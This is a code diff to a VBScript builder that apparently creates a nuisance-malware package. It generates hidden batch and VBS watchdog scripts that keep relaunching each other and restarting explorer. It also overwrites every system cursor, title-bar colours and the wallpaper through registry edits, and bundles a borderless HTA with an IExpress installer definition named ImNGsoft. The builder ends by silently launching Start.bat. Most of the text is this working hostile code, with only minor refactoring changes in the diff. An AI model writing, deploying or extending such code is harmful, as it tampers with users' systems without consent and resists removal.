@@ -28,7 +28,7 @@ If fso.FolderExists(build) Then fso.DeleteFolder build, True
 fso.CreateFolder build
 
 ' ============================================================ generate
-WF DEST & "\Start.bat", Array( _
+W DEST & "\Start.bat", Join(Array( _
 "@echo off", _
 "setlocal enabledelayedexpansion", _
 "title Start", _
@@ -69,7 +69,8 @@ WF DEST & "\Start.bat", Array( _
 "reg add ""HKCU\Control Panel\Cursors"" /ve /t REG_EXPAND_SZ /d ""N (system scheme)"" /f", _
 "for %%a in (Arrow Help AppStarting Wait Crosshair IBeam NWPen No SizeNS SizeWE SizeNWSE SizeNESW SizeAll UpArrow Hand) do reg add ""HKCU\Control Panel\Cursors"" /v %%a /t REG_EXPAND_SZ /d ""%DEST%NCursor.cur"" /f", _
 "exit /b", _
-"", _
+"" _
+), vbCrLf) & vbCrLf & Join(Array( _
 ":colors", _
 "reg add ""HKCU\Control Panel\Colors"" /v ActiveTitle /t REG_SZ /d ""0 0 255"" /f", _
 "reg add ""HKCU\Control Panel\Colors"" /v GradientActiveTitle /t REG_SZ /d ""0 0 255"" /f", _
@@ -97,9 +98,9 @@ WF DEST & "\Start.bat", Array( _
 "tasklist /v /fi ""imagename eq cmd.exe"" 2>nul | find /i ""CheckSoft"" >nul || start """" wscript.exe //nologo ""%DEST%\payload.vbs"" hide ""%DEST%\CheckSoft.bat""", _
 "ping -n 6 127.0.0.1 >nul", _
 "goto loop" _
-)
+), vbCrLf) & vbCrLf
 
-WF DEST & "\CheckSoft.bat", Array( _
+W DEST & "\CheckSoft.bat", Join(Array( _
 "@echo off", _
 "title CheckSoft", _
 "set ""DEST=%~dp0""", _
@@ -120,9 +121,9 @@ WF DEST & "\CheckSoft.bat", Array( _
 "tasklist /fi ""imagename eq explorer.exe"" 2>nul | find /i ""explorer"" >nul || start """" explorer.exe", _
 "ping -n 56 127.0.0.1 >nul", _
 "goto loop" _
-)
+), vbCrLf) & vbCrLf
 
-WF DEST & "\payload.vbs", Array( _
+W DEST & "\payload.vbs", Join(Array( _
 "Option Explicit", _
 "Dim m, sh, fso, p, wav, cmd, i, ok", _
 "If WScript.Arguments.Count = 0 Then WScript.Quit", _
@@ -166,9 +167,9 @@ WF DEST & "\payload.vbs", Array( _
 "        WScript.Sleep 400", _
 "    Loop", _
 "End Select" _
-)
+), vbCrLf) & vbCrLf
 
-WF build & "\ImNGsoft.hta", Array( _
+W build & "\ImNGsoft.hta", Join(Array( _
 "<html>", _
 "<head>", _
 "<hta:application id=""ng"" caption=""no"" border=""none"" scroll=""no"" innerborder=""no"" selection=""no"" maximizebutton=""no"" contextmenu=""no"" />", _
@@ -199,9 +200,9 @@ WF build & "\ImNGsoft.hta", Array( _
 "setInterval(tick,40);", _
 "</script>", _
 "</body></html>" _
-)
+), vbCrLf) & vbCrLf
 
-WF build & "\ImNGsoft.sed", Array( _
+W build & "\ImNGsoft.sed", Join(Array( _
 "[Version]", _
 "Class=IEXPRESS", _
 "SEDVersion=3", _
@@ -224,7 +225,7 @@ WF build & "\ImNGsoft.sed", Array( _
 "AppDir=", _
 "FILE0=ImNGsoft.hta", _
 "[Strings]" _
-)
+), vbCrLf) & vbCrLf
 
 MakeBmp DEST & "\RedWallPaper.bmp"
 MakeCur DEST & "\NCursor.cur"
@@ -268,20 +269,20 @@ On Error GoTo 0
 sh.Run "cmd /c """ & DEST & "\Start.bat""", 0, False
 
 ' ============================================================ parts
-Sub WF(path, arr)
+Sub W(path, text)
     Dim st
     Set st = CreateObject("ADODB.Stream")
     st.Type = 2
     st.Charset = "Shift_JIS"
     st.Open
-    st.Write Join(arr, vbCrLf) & vbCrLf
+    st.Write text
     st.SaveToFile path, 2
     st.Close
 End Sub
 
 Sub MakeBmp(path)
     Dim st, row, i
-    row = String(1024, Chr(0) & Chr(0) & Chr(255))
+    row = String(1024, Chr(0)) & String(1024, Chr(0)) & String(1024, Chr(255))
     Set st = CreateObject("ADODB.Stream")
     st.Type = 2
     st.Charset = "iso-8859-1"
